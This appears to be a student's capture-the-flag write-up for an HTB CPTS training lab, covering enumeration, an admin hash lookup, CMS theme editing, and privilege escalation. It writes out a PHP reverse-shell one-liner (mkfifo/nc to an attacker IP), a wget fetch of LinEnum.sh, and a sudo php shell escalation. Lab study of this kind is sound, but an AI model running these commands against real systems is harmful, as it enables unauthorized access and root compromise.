## Introduction
This is not an official HTB machine but the final part of the Getting Started Module in CPTS Study Path

## Service Scanning
Using nmap -v -sV HOST_IP, we discover there are two opening services
![[Pasted image 20241227152802.png]]


- The HTTP service is Apache httpd 2.4.41, which is the same result with whatweb
Checking on the robots.txt, we see that it has an admin directory which is a login panel
![[Pasted image 20241227153214.png]]

A simple gobuster directory bruteforcing has led to multiple hidden directories, since we know what /admin is and what /theme might be, we check on backups and data first.
The /data directory has an interesting users.xml file
![[Pasted image 20241227154554.png]]
We see that the username is admin and there's a PWD hash in SHA-1. SHA-1 can't be cracked but can be looked up, which is also admin
![[Pasted image 20241227154943.png]]

In the admin panel, we found that the site runs a CMS that is vulnerable to RCE
![[Pasted image 20241227162249.png]]

Usually, we can use the files tab to upload a malicious file but the button wasnt working. Poking around some more, we find out that we can edit the theme with whatever php we want.
![[Pasted image 20241227162534.png]]

Therefore, a reverse shell would prove useful:
<?php system ("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.15.69 4242 >/tmp/f"); ?>


After gaining access, we try to spin up a TTY with either Python/Python3, whichever is available:
![[Pasted image 20241227170908.png]]

Getting the flag:
![[Pasted image 20241227171059.png]]

## Privilege Escalation
![[Pasted image 20241227171441.png]]
Downloading the LinEnum.sh file and start a Python server.

Running the LinEnum.sh on the Remote (we get it by running wget PYTHON_SERVER_IP:PORT/LinEnum.sh), it says that we can spawn a shell in the usr/bin/php folder using the sudo command. 
### Note
the sudo pwnage is a part of the linux privilege escalation course, this was a taken from another write up

![[Pasted image 20241227174821.png]]

Run the command 
![[Pasted image 20241227175028.png]]
There are two ways, we can set a variable and run like this
www-data@gettingstarted:/usr/bin$ CMD="/bin/sh"  
www-data@gettingstarted:/usr/bin$ sudo /usr/bin/php -r "system('$CMD');"

Or directly run the command

![[Pasted image 20241227175500.png]]

### Important
cd ~/ bring us directly to the user directory


